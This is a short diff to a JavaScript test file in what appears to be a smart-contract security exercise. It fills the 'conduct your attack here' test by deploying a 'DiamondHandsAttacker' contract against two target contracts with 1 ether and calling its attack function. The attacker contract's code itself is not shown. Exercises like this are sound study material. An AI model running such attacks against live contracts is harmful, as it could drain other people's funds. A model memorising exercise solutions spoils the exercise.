@@ -44,8 +44,9 @@ describe(NAME, function () {
         });
 
         it("conduct your attack here", async function () {
-        //    Your attack code goes here
-           
+           const AttackerFactory = await ethers.getContractFactory("DiamondHandsAttacker");
+           const attackerContract = await AttackerFactory.connect(attackerWallet).deploy(diamondcontract.address, chickencontract.address, { value: ethers.utils.parseEther("1") });
+           await attackerContract.connect(attackerWallet).attack();
         });
 
        
